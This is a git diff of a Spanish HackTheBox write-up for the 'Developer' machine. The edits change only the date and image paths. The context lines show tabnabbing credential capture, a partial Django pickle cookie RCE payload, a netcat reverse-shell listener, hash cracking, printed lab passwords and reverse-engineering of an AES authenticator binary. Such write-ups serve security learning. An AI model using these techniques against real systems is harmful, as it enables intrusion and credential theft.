@@ -1,6 +1,6 @@
 ---
 title: "Developer"
-date: 2025-05-29 16:41:28 +0200
+date: 2026-10-03 15:03:08 +0200
 categories: writeups HackTheBox
 tags: máquina linux binaryanalysis deserialization django tabnabbing infoleak criptografía pickle criptografía postgreSQL sentry
 description: Writeup de la máquina Developer de Hackthebox.
@@ -20,7 +20,7 @@ openvpn lab_trr0r.opvn
 
 Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140516.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416140516.png>)
 
 > El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.103`.
 ### Nmap
@@ -33,7 +33,7 @@ nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.103 -oG allPorts
 
 Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140643.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416140643.png>)
 
 Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
 
@@ -45,36 +45,36 @@ nmap -p22,80 -sCV 10.10.11.103 -oN targeted
 
 En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es la existencia del dominio **developer.htb**.
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140659.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416140659.png>)
 
 ___
 ### Puerto 80 - HTTP (Apache)
 
 **Virtual Hosting** + `/etc/hosts` + `10.10.11.103 developer.htb`
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140825.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416140825.png>)
 
 nos registraremos y nos logeará automáticamente
 
 resueltos en **Más allá del Root**
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141148.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416141148.png>)
 
 En primer lugar, no tenemos otra opción que resolver cualquiera de ellos para habilitar la posibilidad de subir un writeup.  
 ### Challenge 1: Phised List | Forensic
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141731.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416141731.png>)
 
 ```bash
 unzip phished_credentials.xlsx
 cat xl/sharedStrings.xml
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141907.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416141907.png>)
 
 ahora si que podemos subir un writeup
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416143639.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416143639.png>)
 
 ___
 ## Explotación
@@ -98,11 +98,11 @@ python3 -m http.server 80
 </html>
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416144712.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416144712.png>)
 
 haciendo uso de wget, nos descargaremos todo estos recursos
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416144428.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416144428.png>)
 
 ```bash
 wget -r http://developer.htb/login
@@ -142,34 +142,34 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 php -S 0.0.0.0:80
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183156.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416183156.png>)
 
 Veremos que recibimos una petición por POST desde la máquina vícitma
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183706.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416183706.png>)
 
 **admin:SuperSecurePassword@HTB2021**
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183734.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416183734.png>)
 
 `http://developer.htb/admin/login/`
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183926.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416183926.png>)
 
 `http://developer.htb/admin/sites/site/`
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184008.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416184008.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184621.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416184621.png>)
 ### Cookie Pickle Deseralization | Sentry (developer-sentry.developer.htb)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184754.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416184754.png>)
 
 Crearemos un proyecto y al borrarlo veremos este error
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184826.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416184826.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184857.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416184857.png>)
 
 [RCE on Facebook Server](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/)
 
@@ -193,15 +193,15 @@ newContent['testcookie'] = PickleRce()
 print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190149.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190149.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190203.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190203.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190240.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190240.png>)
 
 **Reverse Shell** + **NetCat** (`nc -nlvp 443`)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190404.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190404.png>)
 
 ___
 ## Movimiento lateral de usuario
@@ -209,23 +209,23 @@ ___
 
 **Tratamiento de la TTY**
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191614.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191614.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190837.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190837.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190903.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416190903.png>)
 
 ### Information Leakage → Cracking Hashes
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191254.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191254.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191229.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191229.png>)
 
 ```bash
 hashcat hash /usr/share/wordlists/rockyou.txt -a0
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191629.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191629.png>)
 
 ```bash
 ssh karl@10.10.11.103 # E introducimos la contraseña: 'insaneclownposse'
@@ -235,18 +235,18 @@ ___
 ## Escalada de privilegios
 ### Enumeración local
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191731.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191731.png>)
 **Sudoers**
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191743.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191743.png>)
 ### /root/.auth/authenticator
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191928.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416191928.png>)
 
 **Transferir archivos**
 
 tampoco es vulenrable al bof
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416192147.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416192147.png>)
 
 ```bash
 string -n 10 authenticator
@@ -260,27 +260,27 @@ The binary is using AES crypto. It’s also clear it is written in Rust (from th
 
 ghidra
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416193552.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416193552.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416203619.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416203619.png>)
 
 [crypto::aes::ctr rust function](https://docs.rs/rust-crypto/latest/crypto/aes/fn.ctr.html)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416195615.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416195615.png>)
 
 **KEY**
 
 <kbd>Click Derecho</kbd> + <kbd>Copy Special</kbd> + <kbd>Byte String (No Spaces)</kbd>
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416204449.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416204449.png>)
 
 lo mismo que antes pero para **IV**
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416204728.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416204728.png>)
 
 hace dos comparaciones, una que algo sea igual a 32 y después compara dos cadenas
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416205329.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250416205329.png>)
 
 ```bash
 gdb ./authenticator -q
@@ -291,9 +291,9 @@ b main
 r
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112338.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112338.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112426.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112426.png>)
 
 ```c
 
@@ -302,9 +302,9 @@ c
 abc
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112716.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112716.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112545.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112545.png>)
 
 ```c
 b *0x55555555b9b9
@@ -315,25 +315,25 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA // python3 -c 'print("A"*32)'
 c
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112906.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112906.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112952.png>)
-
-
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113431.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417112952.png>)
 
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113136.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417113431.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113524.png>)
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113725.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417113136.png>)
+
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417113524.png>)
+
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417113725.png>)
 
 ```bash
 ssh -i id_rsa root@10.10.11.103
 ```
 
-![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113745.png>)
+![](<../assets/images/posts/2026-10-03-developer/Pasted image 20250417113745.png>)
 
 ___
 ## Más allá del Root
